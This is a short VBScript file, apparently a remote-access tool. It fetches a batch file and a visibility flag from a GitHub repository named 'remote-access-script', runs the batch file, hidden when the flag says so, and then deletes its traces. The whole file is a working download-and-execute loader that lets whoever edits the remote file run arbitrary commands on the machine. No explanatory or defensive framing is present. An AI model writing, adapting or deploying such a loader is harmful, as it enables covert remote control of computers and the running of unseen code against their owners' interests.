Set objHTTP = CreateObject("MSXML2.XMLHTTP")
Set objFSO = CreateObject("Scripting.FileSystemObject")
urlBatch = "https://raw.githubusercontent.com/mickr309/remote-access-script/refs/heads/main/commands.bat"
downloadedFile = "C:\log\commands.bat"
urlInvisibleCheck = "https://raw.githubusercontent.com/mickr309/remote-access-script/refs/heads/main/runinvisible.txt"
invisibleFile = "C:\log\runinvisible.txt"

objHTTP.Open "GET", urlInvisibleCheck, False
objHTTP.Send
If objHTTP.Status = 200 Then
    Set objFile = objFSO.CreateTextFile(invisibleFile, True)
    objFile.Write(objHTTP.responseText)
    objFile.Close
End If

Set objFile = objFSO.OpenTextFile(invisibleFile, 1)
strInvisible = objFile.ReadLine
objFile.Close
objFSO.DeleteFile(invisibleFile)

If objFSO.FileExists(downloadedFile) Then
    objFSO.DeleteFile(downloadedFile)
End If

objHTTP.Open "GET", urlBatch, False
objHTTP.Send
If objHTTP.Status = 200 Then
    Set objFile = objFSO.CreateTextFile(downloadedFile, True)
    objFile.Write(objHTTP.responseText)
    objFile.Close

    Set objShell = CreateObject("WScript.Shell")
    If LCase(strInvisible) = "true" Then
        objShell.Run Chr(34) & downloadedFile & Chr(34), 0, True
    Else
        objShell.Run Chr(34) & downloadedFile & Chr(34), 1, True
    End If

    objFSO.DeleteFile(downloadedFile)
End If
